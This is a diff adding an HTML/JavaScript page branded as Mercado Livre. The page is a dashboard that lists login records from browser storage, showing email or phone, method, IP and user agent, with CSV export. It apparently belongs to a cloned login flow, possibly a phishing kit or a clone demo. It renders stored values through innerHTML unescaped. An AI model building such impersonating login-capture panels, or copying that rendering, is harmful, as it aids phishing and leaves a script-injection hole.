@@ -1,0 +1,263 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Dados de Login - Mercado Livre</title>
+<style>
+/* ================== CSS ORIGINAL ================== */
+* { margin:0; padding:0; box-sizing:border-box; }
+body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: linear-gradient(135deg,#f5f5f5 0%,#e8e8e8 100%); min-height:100vh; }
+.header { background:#fff159; padding:16px 0; box-shadow:0 2px 4px rgba(0,0,0,0.1); }
+.header-content { max-width:1200px; margin:0 auto; padding:0 20px; display:flex; justify-content:space-between; align-items:center; }
+.logo { display:flex; align-items:center; gap:8px; }
+.logo-icon { width:40px; height:40px; background:#fff; border-radius:50%; display:flex; align-items:center; justify-content:center; font-weight:bold; color:#3483fa; font-size:18px; }
+.logo-text { font-size:24px; font-weight:600; color:#333; }
+.back-btn { background:#3483fa; color:white; border:none; padding:8px 16px; border-radius:6px; text-decoration:none; font-size:14px; font-weight:500; transition:background 0.3s ease; }
+.back-btn:hover { background:#2968c8; }
+.main-container { max-width:1200px; margin:0 auto; padding:40px 20px; }
+.page-title { font-size:32px; font-weight:600; color:#333; margin-bottom:8px; }
+.page-subtitle { color:#666; font-size:16px; margin-bottom:32px; }
+.stats-grid { display:grid; grid-template-columns:repeat(auto-fit,minmax(250px,1fr)); gap:20px; margin-bottom:40px; }
+.stat-card { background:white; padding:24px; border-radius:12px; box-shadow:0 4px 12px rgba(0,0,0,0.1); text-align:center; }
+.stat-number { font-size:36px; font-weight:700; color:#3483fa; margin-bottom:8px; }
+.stat-label { color:#666; font-size:14px; font-weight:500; }
+.controls { background:white; padding:24px; border-radius:12px; box-shadow:0 4px 12px rgba(0,0,0,0.1); margin-bottom:32px; display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:16px; }
+.search-box { flex:1; min-width:300px; position:relative; }
+.search-input { width:100%; padding:12px 16px 12px 40px; border:2px solid #e6e6e6; border-radius:8px; font-size:14px; transition:border-color 0.3s ease; }
+.search-input:focus { outline:none; border-color:#3483fa; }
+.search-icon { position:absolute; left:12px; top:50%; transform:translateY(-50%); color:#999; font-size:16px; }
+.action-buttons { display:flex; gap:12px; }
+.btn { padding:12px 20px; border:none; border-radius:8px; font-size:14px; font-weight:500; cursor:pointer; transition:all 0.3s ease; }
+.btn-primary { background:#3483fa; color:white; }
+.btn-primary:hover { background:#2968c8; }
+.btn-danger { background:#dc3545; color:white; }
+.btn-danger:hover { background:#c82333; }
+.btn-secondary { background:#6c757d; color:white; }
+.btn-secondary:hover { background:#5a6268; }
+.table-container { background:white; border-radius:12px; box-shadow:0 4px 12px rgba(0,0,0,0.1); overflow:hidden; }
+.table { width:100%; border-collapse:collapse; }
+.table th, .table td { padding:16px; text-align:left; border-bottom:1px solid #e6e6e6; }
+.table th { background:#f8f9fa; font-weight:600; color:#333; font-size:14px; text-transform:uppercase; letter-spacing:0.5px; }
+.table td { font-size:14px; color:#666; }
+.table tbody tr:hover { background:#f8f9fa; }
+.method-badge { display:inline-block; padding:4px 8px; border-radius:12px; font-size:12px; font-weight:500; text-transform:uppercase; }
+.method-email { background:#e3f2fd; color:#1976d2; }
+.method-google { background:#fce4ec; color:#c2185b; }
+.method-phone { background:#e8f5e8; color:#388e3c; }
+.identifier { font-family:'Courier New', monospace; font-weight:500; color:#333; }
+.timestamp { color:#999; font-size:13px; }
+.empty-state { text-align:center; padding:60px 20px; color:#666; }
+.empty-icon { font-size:64px; margin-bottom:16px; opacity:0.5; }
+.empty-title { font-size:20px; font-weight:600; margin-bottom:8px; color:#333; }
+.empty-text { font-size:14px; line-height:1.5; }
+@media (max-width:768px){.main-container{padding:20px}.controls{flex-direction:column;align-items:stretch}.search-box{min-width:auto}.action-buttons{justify-content:center}.table-container{overflow-x:auto}.table{min-width:600px}.stats-grid{grid-template-columns:1fr}}
+.loading { display:flex; justify-content:center; align-items:center; padding:40px; }
+.spinner { width:40px; height:40px; border:4px solid #e6e6e6; border-top:4px solid #3483fa; border-radius:50%; animation:spin 1s linear infinite; }
+@keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}
+.fade-in{animation:fadeIn 0.5s ease-out;}
+@keyframes fadeIn{from{opacity:0;transform:translateY(20px);}to{opacity:1;transform:translateY(0);}}
+</style>
+</head>
+<body>
+
+<header class="header">
+    <div class="header-content">
+        <div class="logo">
+            <div class="logo-icon">ML</div>
+            <span class="logo-text">mercado livre</span>
+        </div>
+        <a href="index.html" class="back-btn">← Voltar</a>
+    </div>
+</header>
+
+<main class="main-container">
+    <h1 class="page-title">Dados de Login</h1>
+    <p class="page-subtitle">Visualize todos os logins realizados no sistema</p>
+
+    <div class="stats-grid">
+        <div class="stat-card">
+            <div class="stat-number" id="totalLogins">0</div>
+            <div class="stat-label">Total de Logins</div>
+        </div>
+        <div class="stat-card">
+            <div class="stat-number" id="todayLogins">0</div>
+            <div class="stat-label">Logins Hoje</div>
+        </div>
+        <div class="stat-card">
+            <div class="stat-number" id="uniqueUsers">0</div>
+            <div class="stat-label">Usuários Únicos</div>
+        </div>
+        <div class="stat-card">
+            <div class="stat-number" id="lastLogin">--</div>
+            <div class="stat-label">Último Login</div>
+        </div>
+    </div>
+
+    <div class="controls">
+        <div class="search-box">
+            <span class="search-icon">🔍</span>
+            <input type="text" class="search-input" id="searchInput" placeholder="Buscar por email, telefone ou método...">
+        </div>
+        <div class="action-buttons">
+            <button class="btn btn-secondary" id="exportBtn">📊 Exportar</button>
+            <button class="btn btn-primary" id="refreshBtn">🔄 Atualizar</button>
+            <button class="btn btn-danger" id="clearBtn">🗑️ Limpar Dados</button>
+        </div>
+    </div>
+
+    <div class="table-container">
+        <div id="loadingState" class="loading" style="display:none;">
+            <div class="spinner"></div>
+        </div>
+        <div id="emptyState" class="empty-state" style="display:none;">
+            <div class="empty-icon">📝</div>
+            <h3 class="empty-title">Nenhum login registrado</h3>
+            <p class="empty-text">
+                Quando alguém fizer login no sistema, os dados aparecerão aqui.<br>
+                <a href="index.html">Fazer um login de teste</a>
+            </p>
+        </div>
+        <table class="table" id="loginsTable" style="display:none;">
+            <thead>
+                <tr>
+                    <th>ID</th>
+                    <th>Identificador</th>
+                    <th>Método</th>
+                    <th>Data/Hora</th>
+                    <th>User Agent</th>
+                    <th>IP</th>
+                </tr>
+            </thead>
+            <tbody id="loginsTableBody"></tbody>
+        </table>
+    </div>
+</main>
+
+<script>
+class LoginDataViewer {
+    constructor(){
+        this.logins = [];
+        this.filteredLogins = [];
+        this.init();
+    }
+
+    init(){
+        this.setupEventListeners();
+        this.loadData();
+    }
+
+    setupEventListeners(){
+        document.getElementById('searchInput').addEventListener('input', e => this.filterLogins(e.target.value));
+        document.getElementById('refreshBtn').addEventListener('click', () => this.loadData());
+        document.getElementById('exportBtn').addEventListener('click', () => this.exportData());
+        document.getElementById('clearBtn').addEventListener('click', () => this.clearData());
+        setInterval(()=>this.loadData(false),30000);
+    }
+
+    loadData(showLoading = true){
+        if(showLoading){
+            document.getElementById('loadingState').style.display='flex';
+            document.getElementById('loginsTable').style.display='none';
+            document.getElementById('emptyState').style.display='none';
+        }
+
+        const savedLogins = JSON.parse(localStorage.getItem('mercadoLivreLogins')||'[]');
+        this.logins = savedLogins;
+        this.filteredLogins = [...this.logins];
+        setTimeout(()=>{
+            document.getElementById('loadingState').style.display='none';
+            if(this.logins.length===0){
+                document.getElementById('emptyState').style.display='block';
+                document.getElementById('loginsTable').style.display='none';
+            }else{
+                document.getElementById('emptyState').style.display='none';
+                document.getElementById('loginsTable').style.display='table';
+                this.renderTable();
+            }
+            this.updateStats();
+        },500);
+    }
+
+    renderTable(){
+        const tbody = document.getElementById('loginsTableBody');
+        tbody.innerHTML='';
+        this.filteredLogins.forEach(login=>{
+            const tr=document.createElement('tr');
+            tr.innerHTML=`
+                <td>${login.id}</td>
+                <td class="identifier">${this.maskSensitiveData(login.email||login.phone)}</td>
+                <td><span class="method-badge method-${login.method.includes('google')?'google':login.method.includes('phone')?'phone':'email'}">${login.method}</span></td>
+                <td class="timestamp">${new Date(login.timestamp).toLocaleString()}</td>
+                <td>${login.userAgent}</td>
+                <td>${login.ip}</td>
+            `;
+            tbody.appendChild(tr);
+        });
+    }
+
+    maskSensitiveData(data){
+        if(!data) return '';
+        if(data.includes('@')){
+            const parts=data.split('@');
+            const name=parts[0];
+            const domain=parts[1];
+            const maskedName=name.length>2?name[0]+'*'.repeat(name.length-2)+name.slice(-1):name;
+            return maskedName+'@'+domain;
+        }else{
+            // telefone
+            return data.replace(/(\d{2})(\d{4,5})(\d{4})/,'($1) $2-$3');
+        }
+    }
+
+    filterLogins(query){
+        query=query.toLowerCase();
+        this.filteredLogins=this.logins.filter(l=>{
+            return (l.email&&l.email.toLowerCase().includes(query))||(l.phone&&l.phone.includes(query))||(l.method&&l.method.toLowerCase().includes(query));
+        });
+        this.renderTable();
+    }
+
+    updateStats(){
+        document.getElementById('totalLogins').textContent=this.logins.length;
+        const today=new Date().toDateString();
+        const todayCount=this.logins.filter(l=>new Date(l.timestamp).toDateString()===today).length;
+        document.getElementById('todayLogins').textContent=todayCount;
+        const uniqueUsers=new Set(this.logins.map(l=>l.email||l.phone));
+        document.getElementById('uniqueUsers').textContent=uniqueUsers.size;
+        if(this.logins.length>0){
+            document.getElementById('lastLogin').textContent=new Date(this.logins[0].timestamp).toLocaleString();
+        }else{
+            document.getElementById('lastLogin').textContent='--';
+        }
+    }
+
+    exportData(){
+        const csvRows=[
+            ['ID','Identificador','Método','Data/Hora','User Agent','IP']
+        ];
+        this.logins.forEach(l=>{
+            csvRows.push([l.id,l.email||l.phone,l.method,l.timestamp,l.userAgent,l.ip]);
+        });
+        const csvContent='data:text/csv;charset=utf-8,'+csvRows.map(e=>e.join(',')).join('\n');
+        const encodedUri=encodeURI(csvContent);
+        const link=document.createElement('a');
+        link.setAttribute('href',encodedUri);
+        link.setAttribute('download','logins.csv');
+        document.body.appendChild(link);
+        link.click();
+        document.body.removeChild(link);
+    }
+
+    clearData(){
+        if(confirm('Tem certeza que deseja limpar todos os logins?')){
+            localStorage.removeItem('mercadoLivreLogins');
+            this.loadData();
+        }
+    }
+}
+
+document.addEventListener('DOMContentLoaded',()=>new LoginDataViewer());
+</script>
+</body>
+</html>
